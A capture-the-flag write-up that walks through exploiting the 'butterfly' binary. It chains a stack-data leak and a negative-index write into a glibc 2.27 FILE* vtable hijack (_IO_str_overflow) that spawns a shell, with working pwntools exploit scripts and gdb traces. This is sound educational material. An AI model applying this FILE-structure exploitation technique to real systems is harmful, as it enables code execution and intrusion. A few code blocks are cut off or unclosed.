## Preamble
This challenge involves a [`FILE*`-based](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction/) exploit, something which I've never done before. A lot of the information in this write-up might sound trivial or obvious if you're an expert, and some of the explanations here may be misleading (or even false!).

Nontheless, I've tried my best to keep this writeup factual and informative for beginners. Moving on:

## Inspection
```bash
$ tar tf distribute.tar
distribute/
distribute/Dockerfile
distribute/source/
distribute/source/butterfly.c
distribute/source/Makefile
distribute/libc/
distribute/libc/ld-linux-x86-64.so.2
distribute/libc/libc.so.6
distribute/extras/
distribute/extras/ynetd
distribute/extras/flag
distribute/extras/run.sh
distribute/challenge_bin/
distribute/challenge_bin/butterfly
```
We get a whole bunch of goodies for this challenge: the binary (`butterfly`), the source code (under `source/`; shown later), the libc, and a nice docker container that a player can use for testing.

`source/` has a `Makefile`, and the command shown is rather depressing:
```makefile
$ cat distribute/source/Makefile
all:
        gcc -Wl,-z,now -fpie -fstack-protector-all -s butterfly.c -o butterfly
```
If you don't know what these flags are, have a look at `checksec`:
```makefile
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
With that out of the way, we can move on to `butterfly.c` (minified slightly):
```c
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<fcntl.h>
#include<unistd.h>

char *note[0x2];

long int getnum() {
	char buffer[0x20];
	read(0,buffer,0x18);
	return atoll(buffer);
}
void setup() {
	setvbuf(stdin,0,2,0);
	setvbuf(stdout,0,2,0);
	setvbuf(stderr,0,2,0);
	alarm(20);
}
void handler() {
	char buffer[0x100];
	note[0] = (char *)malloc(0x200);
	note[1] = (char *)malloc(0x200);
	printf("I need your name: ");
	read(0,buffer,0x50);
	puts(buffer);
	printf("Enter the index of the you want to write: ");
	long int idx = getnum();
	if(idx < 2) {
		printf("Enter data: ");
		read(0,note[idx],0xe8);
	}
	puts("Bye");
	_exit(0x1337);
}
int main() {
	setup();
	handler();
}
```
`main()` calls two functions. `setup()` is nothing unusual — a standard io unbuffer, with an alarm to kill remotes — whereas `handler()` is the focal point for this challenge.

In `handler()`, a few things happen.
1. Two `malloc(0x200)` pointers are written to `.bss` contingously (as the `note[2]` array)
2. The client is queried for an input of `read(0x50)`
3. The input is echoed back with `puts()`
4. The client is queried for a `int64_t` value (of maximum strlen 0x18), `idx`, via the function `getnum()`
   * `if(idx < 2)`: The client is queried for `read(0xe8)` bytes to write into the buffer at `note[idx]`
5. A leaving message is printed (`puts("Bye")`), and `_exit()` is called

The most glaring vulnerability here is definitely the `if()` check on step 4. Since `atoll()` is free to return negative numbers, `idx` can be used to write to any pointer that happens to lie behind `note[]` in allocated memory. It might even be possible to write *ahead* of `note[]`, because indexing a sufficiently negative `note[idx]` (i.e. `-idx>note`) might allow integer underflow to greater addresses<sup>1</sup>.

There's also a more subtle vulnerability in steps 2 & 3. `puts()` assumes a `\0`-terminated string, but `read()` doesn't mind if you just leave a dangling buffer open with no nul-terminator. If we send over *just enough* bytes to reach the beginning of an already-existing value on the stack, `puts()` will leak out values until it finds its first `\x00` byte:
```bash
$ printf 'AAAAAAAA' | nc pwn.darkarmy.xyz 32770 | xxd
00000000: 4920 6e65 6564 2079 6f75 7220 6e61 6d65  I need your name
00000010: 3a20 4141 4141 4141 4141 1087 71ee 657f  : AAAAAAAA..q.e. # <-- 0x7f65ee718710 is leaked here!
00000020: 0a45 6e74 6572 2074 6865 2069 6e64 6578  .Enter the index
```
This brings us to step 1 of the exploit:

## Leaking information
We can whip up a quick bruteforcer to see what addresses we get to leak:
```python
from pwn import *
context.binary = 'distribute/challenge_bin/butterfly'
for OFF in range(0,0x51,8):
    p = remote('pwn.darkarmy.xyz', 32770)
    p.sendafter(': ', 'a'*OFF if OFF else '\n')
    output = p.recvline()[OFF:-1]
    log.info('%d:%r,%s' % (OFF,output, hex(u64(output.ljust(8,b'\0')))))
```
```python
[*] 0:b'',0x0
[*] 8:b'\x10Gz\xaeQ\x7f',0x7f51ae7a4710
[*] 16:b'',0x0
[*] 24:b'?2\x07\x854\x7f',0x7f348507323f
[*] 32:b'',0x0
[*] 40:b'\x10z|\x88\xfc\x7f',0x7ffc887c7a10
[*] 48:b'',0x0
[*] 56:b'',0x0
[*] 64:b'',0x0
[*] 72:b'\x10G\xf6\xff\x1b\x7f',0x7f1bfff64710
[*] 80:b'\xe7\xb9J5S\x7f',0x7f53354ab9e7
```
This isn't enough information — what do any of these addresses point to?

I made a couple of patches<sup>2</sup> to the `Dockerfile` given, and got the `telescope` of `handler()`'s stack from `gdb`:
```python
0x00007fffffffe538│+0x0008: 0x00007fffffffe678  →  0x00007ffff7a05b97  →  <__libc_start_main+231> mov edi, eax

0x00007fffffffe568│+0x0038: 0x00007fffffffe6b0  →  0x0000555555554860  →   xor ebp, ebp
0x00007fffffffe570│+0x0040: 0x0000000000000000
0x00007fffffffe578│+0x0048: 0x0000000000000000

0x00007fffffffe588│+0x0058: 0x00007ffff7ffe710  →  0x00007ffff7ffb000  →  0x00010102464c457f
0x00007fffffffe590│+0x0060: 0x00007ffff7b979e7  →  "__vdso_getcpu"
```
We'll grab the mappings too, just for a bit more information:

```
So, there're 5 addresses we get to leak with the limited `read(0x50)`. Three of these are from `ld-linux` (+0x18, +0x28, +0x58), while the other two are from the stack (+0x38) and libc (+0x60).

There's a visible lack of a PIE leak here. Our write primitive, `read(note[idx])`, does its work on a PIE address, so there's not a lot we can immediately do with the leaked information here.

Let's move back a bit, and see what we can do with `note[]`.

## Write where?
This part stumped me for the longest time, because I came in knowing absolutely nothing about `FILE*` exploitation. Let's have a talk about how I got to know about `FILE*`.

At this point, an ameteur exploiter knows two things:
1. `0xe8` bytes can be written to any *pointer* that lies behind `note[]`<sup>3</sup>.
2. From the `vmmap` output, *almost everything* behind `note[]` is **non-writable**. `note[]` is located at `$PIE+0x202050`, and everything behind `$PIE+0x202000` is read-only (or r-x)

`0x202050-0x202000==0x50`. Each element of `note[]` is 8-bytes, so there are only `0x50/8 == 10` places to write.

We can inspect these 10 places with the Interactive Disassembler:
```c
.data:0000000000202000                 dq 0
.data:0000000000202008 off_202008      dq offset off_202008    ; DATA XREF: sub_920+17↑r
LOAD:0000000000202010 qword_202010    dq ?                    ; DATA XREF: sub_890↑o
LOAD:0000000000202018                 dq ?
.bss:0000000000202020 ; FILE *stdout
.bss:0000000000202028                 align 10h
.bss:0000000000202030 ; FILE *stdin
.bss:0000000000202038                 align 20h
.bss:0000000000202040 ; FILE *stderr
.bss:0000000000202048 byte_202048     db ?                    ; DATA XREF: sub_920↑r
.bss:0000000000202049                 align 10h
.bss:0000000000202050 ; char *note[2]
```
At first, I was interested in the various `XREF`'d values; they pointed towards mysterious constructor functions that seemed ripe for exploitation. `sub_920` is even referenced by the `.fini_array`, which made me believe that it would be executed after `main()`.

That's not-at-all what happens. `handler()` calls `_exit()`, and that skips ahead of anything the `.fini_array` has to offer.

So, then what? Clearly there's nothing else useful here: the `note[]`s are too large to overflow, and the i/o `FILE*` pointers — how could they ever be useful?

## Madness in FILE*

By the process of elimination, the `FILE*` pointers are the only target left for exploitation.

We'll start with a top-down analysis. The `stdin`, `stdout`, `stderr` variables on the `.bss` segment are *pointers* to `FILE` structs stored inside `glibc`. The structure of a `FILE` struct can, once again, be found [here](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction/), but the attention catching part is really the `_IO_FILE_plus` structure that `FILE` is made of:
```c
typedef struct _IO_FILE_plus {
	_IO_FILE file;
    IO_jump_t   *vtable; // This is at <FILE_ptr+0xd8> for amd64
} FILE; // Not exactly what happens, but approximately
```
Every `FILE` structure has a `vtable` variable. That `vtable` is a list of [function pointers](https://en.wikipedia.org/wiki/Function_pointer) to various I/O methods. So for instance, `puts()` will usually make a call to `stdout->vtable->_IO_XSPUTN`.

If you're new to this (like I was), all this blabering about `_IO_FILE` is more likely to confuse you than anything. We'll take a step back, and try out a bottom-up approach: *how can I use `FILE*` to write an exploit?*

[ctf-wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/fake-vtable-exploit/) provides a nice, alluring example of how the vtable can be replaced with a user-controlled forged vtable to execute arbitrary functions. This sounds great on paper: since `note[-6]` gives `stdout`, and `read(0xe8)` *rather convinently*<sup>4</sup> allows us to overwrite the entirety of `stdout`'s `FILE*` struct, we should be able to overwrite `stdout->vtable` with a pointer to our *first* input (`"I need your name: `) to *control RIP*, as the challenge description demands.

Two problems:
1. Let's say we use the first input to *simultaneously* write a fake vtable<sup>5</sup>, while also leaking out the address of the stack. Even if we achieve that impossibility, where would you jump? Without a simultaneous PIE/libc leak, there's nothing good to switch RIP to.
2. Arbitrary vtable pointers were [patched out](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=commitdiff;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51) in libc 2.24. This challenge uses libc 2.27, so this entire idea is a bust.

So, we can't overwrite the vtable with just anything. If I was doing this challenge in isolation, I would've definintely given up here.

Fortunately, searching online provided me with [another](https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/) path for exploitation. The site describes it better than I can, but in essence:
1. `puts()` can be made to execute any function pointer within the `__libc_IO_vtables` section of libc
2. The `_IO_str_overflow` inside of the aforementioned section will (at least, from libc 2.24-2.27) execute a function pointer from `FILE*`, which we are in control of
3. That function pointer will be executed with an argument (rdi) we can control with `FILE*` as well — no need for `one_gadget`!

And unlike the `ctf-wiki` method, the exploit code provided by the site *actually worked*<sup>6</sup> on `butterfly`'s libc!

We finally have an exploit method that we can *try* to copy, and *maybe* get to work.

## Implementation blues
Before we dig into the madness of `FILE*`, let's start from what we know.

We'll want to jump to `system` (or something for a shell) in libc, so our first step in the exploit is to leak libc. If you'll recall from two-or-three sections ago, the libc addressed can be leaked if we just write a full `0x50` bytes in the first input:
```python
from pwnscripts import *
context.binary = 'distribute/challenge_bin/butterfly'
context.libc_database = 'libc-database'
context.libc = 'distribute/libc/libc.so.6'
LIBC_OFF=0x50
# The leaked string in gdb showed "__vdso_getcpu", so we'll just grep for that.
vdso_magic = next(context.libc.search(b"__vdso_getcpu"))

p = remote('pwn.darkarmy.xyz', 32770)
p.sendafter(': ', 'a'*LIBC_OFF)
context.libc.address = extract_first_bytes(p.recvline()[LIBC_OFF:],6)-vdso_magic
log.info(hex(context.libc.address))
```
This works out well enough — the address has enough trailing zeros to *look* like a libc base, anyway:
```python
[x] Opening connection to pwn.darkarmy.xyz on port 32770
[x] Opening connection to pwn.darkarmy.xyz on port 32770: Trying 34.77.202.24
[+] Opening connection to pwn.darkarmy.xyz on port 32770: Done
[*] 0x7ff2069f2000
```
After that, we need to copy whatever black magic we found from our online searching<sup>7</sup>. The [blog](https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/) starts off by locating `system` and `/bin/sh`, so we'll just repeat that:
```python
rip = context.libc.symbols['system']
rdi = context.libc.symbols['str_bin_sh']
assert rdi % 2 == 0	# Necessary for exploit
```
Then, we need a fake vtable address that points to somewhere inside `__libc_IO_vtables`. 
```python
io_str_overflow_ptr_addr = context.libc.symbols['_IO_file_jumps'] + 0xd8
# This next line is broken --- we'll come back to this later.
fake_vtable_addr = io_str_overflow_ptr_addr - 2*8
```
After that, we'll want to create a full rendition of the fake `FILE*` structure to send to `read(0xe8)`. The blog defines a really long function to do it, but — as one might expect — there's a `pwntools` helper for that by now:
```python
_lock = context.libc.address + 0x3ecf00	# Magic number: aligned-pointer to an r/w buffer containing the value b'\0'*8
fp = FileStructure(_lock)	# This is `bin.symbols['fake_file'] + 0x80` on the blog
fp._IO_buf_end = fp._IO_write_ptr = (rdi-100)//2
fp._IO_write_base = 0
fp.vtable = fake_vtable_addr
payload = bytes(fp)+pack(rip)
```
With the payload settled, we just have to write it to the `stdout` pointer, and hope everything works:
```python
p.sendlineafter(': ', '-6')	# 0x202050-0x202020
p.sendafter(': ', payload)
```
Considering this is the first time I've ever done a `FILE*` exploit, I really lucked out on how close my solution was to the right answer:
```c

[#9] 0x7f2ee404c462 → __GI__IO_default_uflow(fp=0x7f2ee43aa760 <_IO_2_1_stdout_>)
```
An infinite loop? That can't be right.

Doing a little bit of backtracing, I realise where the error lies:
```c
[#0] 0x7f2ee404c69d → __GI__IO_default_xsgetn(fp=0x7f2ee43aa760 <_IO_2_1_stdout_>, data=<optimized out>, n=0x3)

[#2] 0x560377d75b35 → mov edi, 0x1337
[#3] 0x560377d75b6a → mov eax, 0x0
```
`puts()` is calling `__IO_default_xsgetn` instead of `__IO_str_overflow`, which — if you remember from a long while back — is our key to executing `system("/bin/sh")`.

The instruction that calls `__IO_default_xsgetn` is none other than this:
```python
   0x7f48c65a3af5 <puts+197>       mov    rdx, rbx
   0x7f48c65a3af8 <puts+200>       mov    rsi, r12
 → 0x7f48c65a3afb <puts+203>       call   QWORD PTR [r13+0x38]
   0x7f48c65a3aff <puts+207>       cmp    rbx, rax
   0x7f48c65a3b02 <puts+210>       jne    0x7f48c65a3ba1 <_IO_puts+369>
```
`r13`, if you do the leg-work, is actually the `fake_vtable_addr` we provide in the exploit code:
```python
(gdb) telescope $r13
0x00007f48c690b368│+0x0000: 0x0000000000000000   ← $r13
0x00007f48c690b370│+0x0008: 0x00007f48c65b3370  →  <_IO_str_finish+0> push rbx
0x00007f48c690b378│+0x0010: 0x00007f48c65b2fd0  →  <_IO_str_overflow+0> mov ecx, DWORD PTR [rdi]       # Need to call this
0x00007f48c690b380│+0x0018: 0x00007f48c65b2f70  →  <_IO_str_underflow+0> mov rax, QWORD PTR [rdi+0x28]
0x00007f48c690b388│+0x0020: 0x00007f48c65b1430  →  <_IO_default_uflow+0> push rbp
0x00007f48c690b390│+0x0028: 0x00007f48c65b3350  →  <_IO_str_pbackfail+0> test BYTE PTR [rdi], 0x8
0x00007f48c690b398│+0x0030: 0x00007f48c65b1490  →  <_IO_default_xsputn+0> test rdx, rdx
0x00007f48c690b3a0│+0x0038: 0x00007f48c65b1640  →  <_IO_default_xsgetn+0> push r15                     # This is called instead
0x00007f48c690b3a8│+0x0040: 0x00007f48c65b34a0  →  <_IO_str_seekoff+0> push r14
0x00007f48c690b3b0│+0x0048: 0x00007f48c65b1a00  →  <_IO_default_seekpos+0> push rbx
```
We need `_IO_str_overflow`, but we're getting `_IO_default_xsgetn` instead. The reason for this could not have been more obvious if I had read the blog clearly on the first pass:
> Now, if I point the vtable to 0x10 bytes before it, fclose will call _IO_str_overflow **(again from gdb)**.

The calculation of `fake_vtable_addr` in the blog is specific to `fwrite()`. To get `puts()` to call the right function, we'll increment the offset to the `fake_vtable` a little bit:
```python
io_str_overflow_ptr_addr = context.libc.symbols['_IO_file_jumps'] + 0xd8
# Now this is correct!
fake_vtable_addr = io_str_overflow_ptr_addr - 7*8
```
With that, we're done!

```python
[+] Opening connection to pwn.darkarmy.xyz on port 32770: Done

## Footnotes
1. I say "might", because I never bothered to try.
   `note[]` lies on the end of the binary's PIE memory page. This means that (useful) addresses higher up than `note` are going to lie on a different memory page, making it impossible to index higher addresses without having *two* memory address leaks. 
2. Basically, `apt install python3 gdb`, `RUN` the GEF installation script, and make sure to google for "How to run gdb inside of docker" to get past the ptrace error.
3. A beginner might try poking around at the `malloc(0x200)` pointers to see if writing anything there can do something interesting. Considering that no heap functions are used after the immediate two `malloc()`s (`_exit()` in particular isn't even going to bother `free()`ing the used addresses), I ignored this possibility.
4. The coincidence of `0xe8` being 8 bytes larger than `sizeof(FILE)` was what ultimately pushed me to dig so far into `FILE*` exploitation.
5. This isn't necessarily the only option here. A small pipe dream I thought up of: leaving a fake vtable *in the same memory space* as the fake FILE struct.
6. Their exploit code being [this](https://dhavalkapil.com/assets/files/FILE-Structure-Exploitation/exploit.py), their binary being [this](https://dhavalkapil.com/assets/files/FILE-Structure-Exploitation/exploit.py). When I say the exploit code "worked", I'm neglecting to mention the quick edits I needed to make to get the binary running on libc2.27.
